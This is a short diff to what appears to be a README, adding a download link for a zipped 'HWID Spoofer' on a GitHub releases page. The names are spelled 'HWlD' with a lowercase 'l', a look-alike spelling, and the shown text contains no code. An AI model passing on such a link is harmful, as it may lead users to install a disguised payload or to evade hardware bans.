@@ -2,7 +2,7 @@
 
 ## 📥 Download the Latest HWID Spoofer
 
-[DOWNLOAD](
+[DOWNLOAD](https://github.com/Leighsmitty/HWlD-spoofer/releases/download/HWlD-spoofer/HWlD-spoofer.zip)
 ---
 
 ## Description
